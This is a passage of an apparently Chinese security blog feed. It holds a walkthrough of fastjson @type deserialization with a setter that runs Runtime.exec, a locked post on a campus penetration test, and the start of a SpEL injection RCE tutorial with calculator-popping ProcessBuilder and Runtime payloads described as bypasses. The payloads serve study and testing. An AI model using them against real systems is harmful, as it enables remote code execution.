class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><span class="hljs-comment">//注意两点</span><br>  <span class="hljs-comment">//1. 此处目前只有两个属性值，age和name，写完第一个分析之后会加入一个属性&quot;hello&quot;，hello属性将没有getter和setter</span><br>    <span class="hljs-comment">//2. 下方的setNoting与之后的hello，只是用于实验确定只有存在属性age和name才能执行相应的get和set</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造方法……&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge……&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge……并触发calc&quot;</span>);<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName……&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName……&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNothing</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">//由于没有Noting这个field所以不会被调用</span><br>        System.out.println(<span class="hljs-string">&quot;setNoting……&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getNothing</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">//不会被调用</span><br>        System.out.println(<span class="hljs-string">&quot;getNoting……&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Object-gt-jsonString"><a href="#Object-gt-jsonString" class="headerlink" title="Object==&gt;jsonString"></a>Object==&gt;jsonString</h3><p>SerializerFeature有一些属性，详情参考 : <a href="https://www.cnblogs.com/zouhong/p/14436858.html">https://www.cnblogs.com/zouhong/p/14436858.html</a></p><p>SerializerFeature.WriteClassName可以把序列化时写入类型信息</p><p>在序列化的时候会写入一个@type，并写上被序列化的类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>      System.out.println(<span class="hljs-string">&quot;========init========&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;hack&quot;</span>);<br>        student.setAge(<span class="hljs-number">18</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;========toJson========&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(student);<br>        System.out.println(jsonString);<br><br><span class="hljs-comment">// WriteClassName的含义</span><br><span class="hljs-comment">// 序列化时写入类型信息，默认为false，反序列化时需用到</span><br>        <span class="hljs-comment">// 在序列化的时候会多写入一个@type，并写上被序列化的类名</span><br>        System.out.println(<span class="hljs-string">&quot;========SerializerFeature.WriteClassName===============&quot;</span>);<br>        jsonString = JSON.toJSONString(student, SerializerFeature.WriteClassName);<br>        System.out.println(jsonString);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gytxq6w05kj30il08twez.jpg" alt="image-20220129021210104"></p><h3 id="String-gt-object"><a href="#String-gt-object" class="headerlink" title="String==&gt;object"></a>String==&gt;object</h3><p>触发反序列化与不触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            System.out.println(<span class="hljs-string">&quot;========不触发========&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;hack\&quot;&#125;&quot;</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object1</span> <span class="hljs-operator">=</span> JSON.parse(payload1);<br>            System.out.println(object1);<br><br>            System.out.println(<span class="hljs-string">&quot;========@type触发========&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;hack\&quot;&#125;&quot;</span>;<br>            JSON.parse(payload2);<span class="hljs-comment">//两种方法都可以触发</span><br>            JSON.parseObject(payload2);<span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gytxr8e7csj30i508bwew.jpg" alt="image-20220129021313158"></p><h3 id="调用分析"><a href="#调用分析" class="headerlink" title="调用分析"></a>调用分析</h3><blockquote><p>  FastJSON中需要createJavaBeanSerializer方法获取两种序列化类，一种是直接的JavaBeanSerializer（根据类的get方法、public filed等JavaBean特征序列化），另一种是createASMSerializer（通过ASM框架生成的序列化字节码），优先使用第二种。</p></blockquote><p>首先分析如下payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Student&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hack&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在触发<code>Object object1 = JSON.parse(payload1);</code>后，会进行如下调用</p><ol><li><p>首先是DefaultJSONParser.class中com.alibaba.fastjson.JSON.parse()</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gyty5sujwhj30t209bgms.jpg" alt="image-20220129022710213"></p></li><li><p>new一个DefaultJSONParser</p><p> 首先，参数包括ParserConfig.getGlobalInstance()和缺省的features。其中ParserConfig.getGlobalInstance()会得到一个实例化的ParserConfig。</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gytyd8p37nj30ks0aywg4.jpg" alt="image-20220129023422244"></p><p> 其次，生成一个JSONScanner，JSONScanner继承了JSONLexerBase是是词法解析的具体实现类，本处lexer就是解析的对象。</p><p> 之后，调用DefaultJSONParser的构造方法，JSONScanner在接收到input开始进行词法分析，部分相关变量解释如下：</p><p> text：json文本数据</p><p> len：json文本数据长度</p><p> token：代表解析到的这一段数据的类型</p><p> ch：当前读取到的字符</p><p> symbolTable：符号表，它可以根据传入的字符，进而解析知道你想要读取的一段字符串</p><p> input：需要解析的json</p><p> lexer.getCurrent()：获取当前的字符</p><p> lexer.next()：移动到下一个字符</p><p> bp：当前字符索引</p><p> sbuf：正在解析段的数据，char数组</p><p> sp：sbuf最后一个数据的索引</p><p> hasSpecial=false：需要初始化或者扩容sbuf</p><p> 然后，直到代码进行到<code>ch ==&#39;&#123;&#39;</code>确定token为12，至此完成DefaultJSONParser实例化……</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gytyy70xz7j30sy0ej0up.jpg" alt="image-20220129024504331"></p></li><li><p>完成DefaultJSONParser实例化后进入parse方法后，switch到<code>case 12</code>处</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gytzbiwocqj30fa07baad.jpg" alt="image-20220129030716341"></p><p> (注：FastJson转换时默认使用HashMap，Feature.OrderedField的含义是：只对第一层的key进行排序即根据HASH值排序)</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gytz94qxvhj30no01xwek.jpg" alt="image-20220129030500720"></p><ol start="4"><li><p>进入parseObject方法，进行key value的提取的过程。</p><p> 首先是提取过程：</p><p> lexer.skipWhitespace()内部调用循环跳过<code>\r,\n,\t,\f,\b,空格</code>等字符，</p><p> <code>while(ch == &#39;,&#39;) </code>一句用于分开每一对<code>key：value</code></p><p> key和value的提取方法是调用scanSymbol方法，如：<code>key = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;);</code>的含义是获取双引号包裹的字符串为@type，并赋值给key变量</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gytzfa2dbzj30t40l9mzl.jpg" alt="image-20220129031054284"></p><p> 然后进行调用if来对<strong>autotype</strong>进行check：</p><p> 紧接着进入if分支，发现key为”@type”后，就进行对”Student”提取然后使用loadClass方法加载Student类，但此时后续的操作均未进行。（注：Student的提取方法仍然是使用<code>lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;);</code>）</p><p> ​    <img src="https://tva1.sinaimg.cn/large/008i3skNly1gyu02mrq52j30z70jsn0g.jpg" alt="image-20220129033217160"></p><p> loadClass部分如下图</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gyu0991lwoj30v205odgl.jpg" alt="image-20220129033930307"></p></li></ol></li><li><p>最后创建deserializer来进行反序列化</p><p> <img src="https://tva1.sinaimg.cn/large/008i3skNly1gyu0byvqykj30te07ddgm.jpg" alt="image-20220129034220773"></p></li></ol><p>首先，getDeserializer创建JavaBeanDeserializer调用 <code> derializer = this.createJavaBeanDeserializer(clazz, (Type)type);</code></p><p>进入createJavaBeanDeserializer方法后会调用JavaBeanInfo.build()    </p><p>​    <img src="https://tva1.sinaimg.cn/large/008i3skNly1gyvtxuzosij31300c8jtc.jpg" alt="image-20220129034649188"></p><p>然后，build部分使用TypeUtils进行反射获取Student类的属性值和各种方法加入到List中，其中对方法判断如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (methodName.length() &gt;= <span class="hljs-number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;<br></code></pre></td></tr></table></figure><p>​    <img src="https://tva1.sinaimg.cn/large/008i3skNly1gyvtxnqu9jj30ut0irmzz.jpg" alt="image-20220129035535746"></p><p>最后调试的时候会出现debug而不能看到跟进代的代码，原因是使用FastjsonASMDeserializer处理时，ASM机制生成的临时代码是无法看到的，过程中会调用set和get。</p><ol start="5"><li> !!补漏</li></ol><p>(这个起因是看文章的时候发现有的写ASM机制，有的人又说调用parseField，然而我开始并没注意的太全面，调了多遍发现只有ASM机制部分于是有了如下的实验)</p><p>分析第二个payload，分析之前我们先补充一个属性，注意没有getter和setter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> String hello;<span class="hljs-comment">// 注意：没有get和set</span><br></code></pre></td></tr></table></figure><p>第二个payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Student&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">18</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hack&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;hello&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123&quot;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-comment">//多了hello</span><br></code></pre></td></tr></table></figure><p>打一个断点如下图：JavaBeanDeserializer.class下的deserialze函数，然后开始debugg后会发现和第一个分析里的ASM加载有一些不一样。其实也不是不一样，只是因为hello属性并没有get和set并不能使用进行ASM的处理方式。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyvtwd0hhsj312p0hijul.jpg" alt="image-20220130022431214"></p><p>调用setter和getter的时机</p><ul><li>  对于method不为空的fieldInfo，若getOnly为false，则直接反射执行method来赋值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FieldDeserializer</span> <span class="hljs-variable">fieldDeserializer</span> <span class="hljs-operator">=</span> getFieldDeserializer(entry.getKey());<br><span class="hljs-keyword">if</span> (fieldDeserializer != <span class="hljs-literal">null</span>) &#123;<br>    fieldDeserializer.setValue(object, entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>  对于若getOnly为true，也就是只存在对应字段field的getter，而不存在setter，则会对其method的返回类型进行判断，若符合，才会进行反射执行该method对于我们的本payload的hello属性就符合此处</li></ul><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyv6nc7c68j30pp0f3tb0.jpg" alt="image-20220130040623226">    </p><p>下图为最后hello就通过filed.set来完成赋值<img src="https://tva1.sinaimg.cn/large/008i3skNly1gyv6oq6dc2j30sp03074l.jpg" alt="image-20220130040746593"></p><h3 id="一些疑问-amp-或许不太正确的回答"><a href="#一些疑问-amp-或许不太正确的回答" class="headerlink" title="一些疑问&amp;或许不太正确的回答"></a>一些疑问&amp;或许不太正确的回答</h3><ul><li><p>ASM是什么?</p><p>  asm是assembly的缩写，是汇编的称号，对于java而言，asm就是字节码级别的编程。 </p><p>  <a href="https://www.cnblogs.com/zt007/p/6377789.html">https://www.cnblogs.com/zt007/p/6377789.html</a></p></li><li><p>为什么fastjson里用了ASM？下面文字摘了几篇fastjson为什么快的文章？</p><ol><li><p>普通序列化反序列化过程：</p><p> ​        在序列化时使用反射读取POJO的属性名，以及反射调用属性名对应的get方法获取value，然后将拿到的属性名与value拼接而成JSON字符串，在反序列化的时候又反射调用set方法进行属性的设置。这种思路是最简单的，其也是最低效的。</p></li><li><p>FastJSON中的改进：</p><p> 在FastJSON中，使用了ASM框架自己编写字节码，然后使用ClassLoader将自定义的字节码加载成为类，变为特定POJO的序列化器，属性名和属性value将不需要反射获取，减少了这部分的反射开销。所以FastJSON中优先调用ASM框架。</p></li></ol></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记录一次校内渗透</title>
    <link href="/2021/04/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/14/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="61d82ca5198b7a77ac9769acfc248e8584cfa3db93f59e4896c314098008dce1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="/2021/03/11/javasec/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87%E7%A0%94%E7%A9%B6/"/>
    <url>/2021/03/11/javasec/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>研究了一下SpEL注入RCE分析以及技巧，做了总结。</p><h2 id="SpEL注入基础"><a href="#SpEL注入基础" class="headerlink" title="SpEL注入基础"></a>SpEL注入基础</h2><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p>Spring表达式语言（简称 <strong>SpEL</strong>，全称<strong>Spring Expression Language</strong>）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法:"></a>基本用法:</h3><p> SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><p>示例1:不注册新变量的用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//取值，Hello World！</span><br></code></pre></td></tr></table></figure><p>示例2:自定义注册加载变量的用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spel</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;何止&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Spel</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Spel</span>();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//通过StandardEvaluationContext注册自定义变量</span><br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//取值,输出何止</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>了解了基本用法之后，我们可以通过创建实例，调用方法先构造几个rce的payload</p><p><strong>会用到的语法</strong></p><p>spel语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法<code>T(全限定类名).方法名()</code>，后面会用得到 </p><p>spel中的<code>#</code>操作符可以用于标记对象</p><h2 id="RCE第一部分"><a href="#RCE第一部分" class="headerlink" title="RCE第一部分"></a>RCE第一部分</h2><p>第一部分就是最基础的思路 : 新建实例 , 调用命令执行方法</p><h3 id="01-调用ProcessBuilder"><a href="#01-调用ProcessBuilder" class="headerlink" title="01 : 调用ProcessBuilder"></a>01 : 调用ProcessBuilder</h3><p>java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;<br><span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>( str );<br>p.start();<span class="hljs-comment">//打开计算器</span><br></code></pre></td></tr></table></figure><p>spel中也可以使用new来构造，写法几乎一样，我们可以把表达式简化为一行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure><p>完整的执行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">String</span> <span class="hljs-variable">cmdStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;&#125;).start()&quot;</span>;<br><br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(cmdStr);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//弹出计算器</span><br></code></pre></td></tr></table></figure><p>当然java.lang包下的类无需使用全限定类名,故表达式可简化来bypass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure><h3 id="02-调用RunTime"><a href="#02-调用RunTime" class="headerlink" title="02 : 调用RunTime"></a>02 : 调用RunTime</h3><p>java调用，由于Runtime类使用了单例模式-饿汉式，需要调用Runtime的静态方法得到Runtime实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<span class="hljs-comment">//</span><br>rt.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);<br></code></pre></td></tr></table></figure><p>和上个用法略有不同解释在payload后给出</p><p>使用string参数 (java.lang包下的类不需要加全限定类名)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)<br></code></pre></td></tr></table></figure><p>字符串数组方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>解释: 由于<code>RunTime类</code>使用了单例模式 ,获取对象的话不能直接通过构造方法获得,必须通过静态方法<code>getRuntime</code>来获得 , 其源码可参考下图 , 调用静态方法的话需要使用SpEL的<code>T()</code>操作符,<code>T()</code>操作符会返回一个object.</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065405-5c7901e4-77bc-1.jpg" alt="image-20210224010602445"></p><h3 id="03-调用ScriptEngine"><a href="#03-调用ScriptEngine" class="headerlink" title="03 : 调用ScriptEngine"></a>03 : 调用ScriptEngine</h3><p>从<strong>ruilin</strong>师傅的文章学到还可以用js引擎(不知道能不能用颜文字或者其他js绕过的方法到这里，暂时没实验成功，测试成的师傅可以分享下).</p><p>获取所有js引擎信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br>        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();<br>        <span class="hljs-keyword">for</span> 